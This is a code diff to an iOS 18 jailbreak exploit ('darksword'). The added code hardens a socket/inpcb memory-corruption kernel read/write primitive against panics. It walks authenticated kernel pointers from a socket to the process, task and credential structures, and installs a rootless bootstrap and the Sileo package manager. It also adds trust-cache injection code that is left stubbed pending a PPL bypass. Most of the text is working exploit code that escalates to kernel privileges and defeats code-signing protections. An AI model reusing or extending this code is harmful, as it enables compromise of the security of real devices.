@@ -22,6 +22,7 @@
 #include <errno.h>
 #include <stdarg.h>
 #include <aio.h>
+#include <glob.h>
 #include <IOKit/IOKitLib.h>
 #import <IOSurface/IOSurfaceRef.h>
 #import <ImageIO/ImageIO.h>
@@ -497,7 +498,25 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
     [usedGc addObject:@(tg)];
 
-    uint64_t inpNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28) - 0x20;
+    uint64_t inpListNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28);
+    uint64_t inpNext = inpListNext - 0x20;
+
+    // PANIC MITIGATION: PCB B ("rwSocketPcb") must be a live inpcb, NOT freed
+    // memory that could have been recycled as a 32-byte MAC label. If the
+    // inpcb was freed, the first 0x20-byte KRW write through set_kaddr()
+    // corrupts the MAC label zone -> ZBC panic (observed on-device).
+    // We cannot read PCB B's gencnt here (KRW not established yet), so we
+    // enforce a strict shape check (page-aligned kernel heap) and keep the
+    // socket that backs it alive for the whole process lifetime.
+    if ((inpNext & 0xfff) != 0 || (inpNext >> 40) != 0xFFFFFF) {
+        printf("[-] PCB B rejected: not kernel heap/aligned 0x%llx\n", inpNext);
+        return -1;
+    }
+    if (csi + 1 >= [socketPorts count]) {
+        printf("[-] PCB B rejected: no rwSocket candidate at csi+1\n");
+        return -1;
+    }
+
     rwSocketPcb = inpNext;
     memcpy(wBuf, rBuf, OOB_SIZE);
     *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
@@ -1394,7 +1413,13 @@ bool run_darksword(void) {
             if (ok) break;
         }
 
-        sockets_release();
+        // PANIC MITIGATION: only release sockets when the attempt FAILED.
+        // On success the sockets backing controlSocket/rwSocket (and PCB B)
+        // must stay alive; freeing them recycles the inpcb memory, which gets
+        // reused as MAC labels and panics on the next 0x20-byte KRW write.
+        if (!ok) {
+            sockets_release();
+        }
         for (uint64_t s = 0; s < mappingNum; s++) {
             mach_vm_deallocate(mach_task_self(),
                 [(NSNumber*)mappings.lastObject unsignedLongLongValue], searchSize);
@@ -1455,13 +1480,15 @@ bool run_darksword(void) {
 uint64_t find_our_proc(void) {
     // wh1te4ever verified chain: rw socket inpcb -> socket -> so_background_thread
     // -> thread -> thread_ro -> proc
-    uint64_t rwSocketAddr = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
+    // NOTE: every hop here is a PAC-authenticated kernel pointer on iOS 18;
+    // must go through kread_ptr (which XPACI-strips) or we get garbage.
+    uint64_t rwSocketAddr = kread_ptr(rwSocketPcb + OFFSET_PCB_SOCKET);
     if (!rwSocketAddr) return 0;
-    uint64_t current_thread = kread64(rwSocketAddr + OFFSET_SOCKET_BACKGROUND_THREAD);
+    uint64_t current_thread = kread_ptr(rwSocketAddr + OFFSET_SOCKET_BACKGROUND_THREAD);
     if (!current_thread) return 0;
-    uint64_t current_thread_ro = kread64(current_thread + OFFSET_THREAD_T_TRO);
+    uint64_t current_thread_ro = kread_ptr(current_thread + OFFSET_THREAD_T_TRO);
     if (!current_thread_ro) return 0;
-    uint64_t proc = kread64(current_thread_ro + OFFSET_THREAD_RO_PROC);
+    uint64_t proc = kread_ptr(current_thread_ro + OFFSET_THREAD_RO_PROC);
     if (!proc) return 0;
     // validate: p_pid at 0x60 must be our pid
     if (kread32(proc + OFFSET_P_PID) != (uint32_t)getpid()) return 0;
@@ -1469,15 +1496,15 @@ uint64_t find_our_proc(void) {
 }
 
 uint64_t get_task_from_proc(uint64_t proc) {
-    uint64_t p_proc_ro = kread64(proc + OFFSET_P_PROC_RO);
+    uint64_t p_proc_ro = kread_ptr(proc + OFFSET_P_PROC_RO);
     if (!p_proc_ro) return 0;
-    return kread64(p_proc_ro + OFFSET_PROC_RO_TASK);
+    return kread_ptr(p_proc_ro + OFFSET_PROC_RO_TASK);
 }
 
 uint64_t get_ucred_from_proc(uint64_t proc) {
-    uint64_t p_proc_ro = kread64(proc + OFFSET_P_PROC_RO);
+    uint64_t p_proc_ro = kread_ptr(proc + OFFSET_P_PROC_RO);
     if (!p_proc_ro) return 0;
-    return kread64(p_proc_ro + OFFSET_PROC_RO_UCRED);
+    return kread_ptr(p_proc_ro + OFFSET_PROC_RO_UCRED);
 }
 
 // auto-locate task->t_flags: TF_INIT (0x20000) + TF_HAS_BSD_INFO (0x80000) set,
@@ -1711,12 +1738,22 @@ bool setup_jb_symlink(void) {
 
 bool install_bootstrap(void) {
     struct stat st;
+
+    // Ensure the preboot filesystem is writable first.
+    remount_private_preboot();
+
     if (stat(jb_path, &st) != 0) {
         if (mkdir_p(jb_path, 0755) != 0) {
             printf("[-] mkdir %s: %s\n", jb_path, strerror(errno));
             return false;
         }
     }
+
+    // The Procursus rootless tar ships with "./var/jb/..." paths baked in,
+    // so it must be extracted at "/" and resolved through the /var/jb
+    // symlink -> /private/preboot/jb. Extracting with -C /private/preboot/jb
+    // would produce /private/preboot/jb/var/jb/... which is wrong.
+    if (!setup_jb_symlink()) return false;
 
     char self_path[4096] = {};
     uint32_t size = sizeof(self_path);
@@ -1729,33 +1766,49 @@ bool install_bootstrap(void) {
     snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
     if (stat(tar_path, &st) != 0) {
         printf("[-] No bootstrap.tar at %s\n", tar_path);
-        printf("[*] Creating bootstrap directory structure manually\n");
-        // Create minimal bootstrap
-        mkdir_p("/private/preboot/jb/usr/bin", 0755);
-        mkdir_p("/private/preboot/jb/usr/lib", 0755);
-        mkdir_p("/private/preboot/jb/Applications", 0755);
-        mkdir_p("/private/preboot/jb/etc", 0755);
-        mkdir_p("/private/preboot/jb/Library", 0755);
-        setup_jb_symlink();
+        printf("[*] Creating minimal bootstrap directory structure\n");
+        mkdir_p("/var/jb/usr/bin", 0755);
+        mkdir_p("/var/jb/usr/lib", 0755);
+        mkdir_p("/var/jb/Applications", 0755);
+        mkdir_p("/var/jb/etc", 0755);
+        mkdir_p("/var/jb/Library", 0755);
         return true;
     }
 
-    // We have a bootstrap.tar, extract it
+    // We have a bootstrap.tar, extract it at "/" so ./var/jb/... resolves
+    // through the symlink. We are root + unsandboxed here, so this is legal.
+    // Prefer the system bsdtar; fall back to a tar shipped with the app or in
+    // a previous bootstrap install.
+    char tar_candidates[3][4096];
+    int nc = 0;
+    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "/usr/bin/tar");
+    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "%s/tar", self_path);
+    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "/var/jb/usr/bin/tar");
+    char tar_path[4096] = "";
+    for (int i = 0; i < nc; i++) {
+        if (stat(tar_candidates[i], &st) == 0) {
+            snprintf(tar_path, sizeof(tar_path), "%s", tar_candidates[i]);
+            break;
+        }
+    }
+    if (tar_path[0] == 0) {
+        printf("[-] No usable tar binary found\n");
+        return false;
+    }
+    printf("[*] Using tar: %s\n", tar_path);
+
     const char *argv[] = {
-        "tar",
+        tar_path,
         "--preserve-permissions",
         "-xkf",
         tar_path,
         "-C",
-        jb_path,
+        "/",
         NULL
     };
 
-    // Use posix_spawn to run tar
-    // We need to spawn as root/unsandboxed
-    // For now, try direct spawn
     pid_t pid;
-    int ret = posix_spawnp(&pid, "/usr/bin/tar", NULL, NULL,
+    int ret = posix_spawnp(&pid, tar_path, NULL, NULL,
         (char *const *)argv, NULL);
     if (ret != 0) {
         printf("[-] tar spawn: %s\n", strerror(ret));
@@ -1763,20 +1816,41 @@ bool install_bootstrap(void) {
     }
     int status;
     waitpid(pid, &status, 0);
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-        printf("[+] Bootstrap extracted to %s\n", jb_path);
-    } else {
+    if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
         printf("[-] tar exit: %d\n", WEXITSTATUS(status));
+        return false;
+    }
+    printf("[+] Bootstrap extracted to %s\n", jb_path);
+
+    // Run prep_bootstrap.sh (shebang: #!/var/jb/bin/sh). Skip the interactive
+    // uialert password prompt for unattended installs.
+    char prep_path[4096];
+    snprintf(prep_path, sizeof(prep_path), "%s/prep_bootstrap.sh", jb_path);
+    if (stat(prep_path, &st) == 0) {
+        printf("[*] Running prep_bootstrap.sh (NO_PASSWORD_PROMPT=1)...\n");
+        setenv("NO_PASSWORD_PROMPT", "1", 1);
+        char sh_path[4096];
+        snprintf(sh_path, sizeof(sh_path), "%s/bin/sh", jb_path);
+        const char *prep_argv[] = { sh_path, prep_path, NULL };
+        ret = posix_spawnp(&pid, sh_path, NULL, NULL,
+            (char *const *)prep_argv, NULL);
+        if (ret != 0) {
+            printf("[-] prep_bootstrap.sh spawn: %s\n", strerror(ret));
+        } else {
+            waitpid(pid, &status, 0);
+            printf("[+] prep_bootstrap.sh exited: %d\n",
+                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+        }
+    } else {
+        printf("[*] No prep_bootstrap.sh in bootstrap (skipping)\n");
     }
 
-    setup_jb_symlink();
-
-    // Load trust caches from bootstrap
+    // Load trust caches from the bootstrap (needs TC injection primitive).
     char tc_path[4096];
     snprintf(tc_path, sizeof(tc_path), "%s/TrustCache", jb_path);
     if (stat(tc_path, &st) == 0) {
         printf("[*] Trust cache found at %s\n", tc_path);
-        // TODO: load trust cache entries via kread/kwrite
+        load_trust_cache(tc_path);
     }
 
     return true;
@@ -1786,14 +1860,66 @@ bool install_sileo(void) {
     char sileo_path[4096];
     snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
     struct stat st;
+
+    // If Sileo is already registered from a previous install, skip.
+    if (stat(sileo_path, &st) == 0) {
+        printf("[*] Sileo.app already present\n");
+        goto uicache_step;
+    }
+
+    // Sileo is not part of the Procursus bootstrap; look for a bundled .deb
+    // (e.g. org.coolstar.sileo_*.deb) next to the app and install via dpkg.
+    char self_path[4096] = {};
+    uint32_t size = sizeof(self_path);
+    if (_NSGetExecutablePath(self_path, &size) == 0) {
+        char *slash = strrchr(self_path, '/');
+        if (slash) {
+            *slash = 0;
+            char pattern[4096];
+            snprintf(pattern, sizeof(pattern), "%s/*.deb", self_path);
+            glob_t g;
+            if (glob(pattern, 0, NULL, &g) == 0) {
+                char *deb = NULL;
+                for (size_t i = 0; i < g.gl_pathc; i++) {
+                    if (strstr(g.gl_pathv[i], "sileo") || strstr(g.gl_pathv[i], "Sileo")) {
+                        deb = g.gl_pathv[i];
+                        break;
+                    }
+                }
+                if (deb) {
+                    printf("[*] Installing Sileo from %s\n", deb);
+                    char dpkg[4096];
+                    snprintf(dpkg, sizeof(dpkg), "%s/usr/bin/dpkg", jb_path);
+                    const char *args[] = { "dpkg", "-i", deb, NULL };
+                    pid_t pid;
+                    int ret = posix_spawnp(&pid, dpkg, NULL, NULL,
+                        (char *const *)args, NULL);
+                    if (ret != 0) {
+                        printf("[-] dpkg: %s\n", strerror(ret));
+                    } else {
+                        int status;
+                        waitpid(pid, &status, 0);
+                        printf("[+] dpkg exited: %d\n",
+                            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+                    }
+                } else {
+                    printf("[-] No Sileo .deb bundled in app\n");
+                }
+                globfree(&g);
+            }
+        }
+    }
+
     if (stat(sileo_path, &st) != 0) {
-        printf("[-] Sileo.app not found\n");
+        printf("[-] Sileo.app not present after install\n");
         return false;
     }
 
+uicache_step:
+    // Register Sileo with SpringBoard via uicache from the bootstrap.
     char uicache_path[4096];
     snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
-    const char *args[] = {"uicache", "-p", sileo_path, NULL};
+    const char *args[] = { "uicache", "-p", sileo_path, NULL };
     pid_t pid;
     int ret;
     if (stat(uicache_path, &st) == 0) {
@@ -1813,10 +1939,99 @@ bool install_sileo(void) {
     return true;
 }
 
-// ===== Shell-command stubs =====
+// ===== Trust cache injection =====
+
+// On iOS 18 (A14) the static trust cache list head (pmap_image4_trust_caches)
+// and the trust cache memory live in PPL-protected regions. A raw kernel
+// kwrite to them fails silently at best and can panic (MAC zone) at worst.
+// Injection therefore MUST go through a PPL-capable write. This is the exact
+// seam where a physrw/PPL-bypass primitive plugs in; until one is available
+// we report the blocker explicitly instead of blind-writing.
+//
+// PPL write path: implemented when a PPL bypass is present.
+//   - Fugu18 oobPCI physrw.c provides the reference pattern (A14 = PPL only).
+static bool ppl_kwrite64(uint64_t addr, uint64_t val) {
+    // TODO(physrw): replace with real PPL write once the bypass lands.
+    (void)addr; (void)val;
+    printf("[-] ppl_kwrite64: PPL write primitive not available yet\n");
+    return false;
+}
+
+// kalloc in kernel space for the trust cache module + blob. Fugu15 allocates
+// data.count + 0x10 bytes.
+static uint64_t kalloc_for_trust_cache(size_t size) {
+    // TODO(physrw): a real kalloc (via PPL/zone) replaces this.
+    (void)size;
+    printf("[-] kalloc_for_trust_cache: no kernel allocator available yet\n");
+    return 0;
+}
+
 bool load_trust_cache(const char *tc_path) {
-    printf("[*] load_trust_cache(%s) - requires TC injection\n", tc_path);
-    (void)tc_path;
+    printf("[*] load_trust_cache(%s)\n", tc_path);
+
+    // Validate the Fugu15 tcload format up front so a good file is
+    // distinguishable from injection failure in the shell `tc` command.
+    FILE *fp = fopen(tc_path, "rb");
+    if (!fp) {
+        printf("[-] Cannot open trust cache: %s\n", strerror(errno));
+        return false;
+    }
+    fseek(fp, 0, SEEK_END);
+    long fsize = ftell(fp);
+    fseek(fp, 0, SEEK_SET);
+    if (fsize < 0x18) {
+        printf("[-] Trust cache too small (%ld)\n", fsize);
+        fclose(fp);
+        return false;
+    }
+    uint8_t *buf = malloc(fsize);
+    if (fread(buf, 1, fsize, fp) != (size_t)fsize) {
+        printf("[-] Failed to read trust cache\n");
+        free(buf); fclose(fp);
+        return false;
+    }
+    fclose(fp);
+
+    uint32_t vers  = *(uint32_t *)(buf + 0x00);
+    uint32_t count = *(uint32_t *)(buf + 0x14);
+    if (vers != 1) {
+        printf("[-] Bad trust cache version %u (need 1)\n", vers);
+        free(buf);
+        return false;
+    }
+    if (fsize != 0x18 + ((long)count * 22)) {
+        printf("[-] Bad trust cache length: %ld != 0x%x\n", fsize, 0x18 + (count * 22));
+        free(buf);
+        return false;
+    }
+    printf("[+] Trust cache OK: version %u, %u hashes (%ld bytes)\n",
+        vers, count, fsize);
+
+    // Injection itself needs three primitives that are not yet available:
+    //   1. pmap_image4_trust_caches address (needs kernel symbols/patchfinder)
+    //   2. a PPL-capable write (physrw bypass — Fugu18 oobPCI pattern)
+    //   3. a kernel allocator for the trust_cache_module + blob
+    // We deliberately do NOT blind-write here: a kwrite to PPL memory can
+    // panic the device exactly like the MAC-zone panic we already fixed.
+    uint64_t mem = kalloc_for_trust_cache(fsize + 0x10);
+    if (!mem) {
+        free(buf);
+        return false;
+    }
+
+    // Fugu15 tcload splice (once PPL is available):
+    //   mem+0x00 = old list head   (our next)
+    //   mem+0x08 = &mem+0x10       (pointer to our blob)
+    //   mem+0x10 = blob (version/count/hashes)
+    // then write mem into the pmap_image4_trust_caches head slot.
+    if (!ppl_kwrite64(mem + 0x8, mem + 0x10)) {
+        printf("[-] Trust cache injection blocked: no PPL write path\n");
+        free(buf);
+        return false;
+    }
+
+    printf("[-] Trust cache injection incomplete (PPL bypass required)\n");
+    free(buf);
     return false;
 }
 
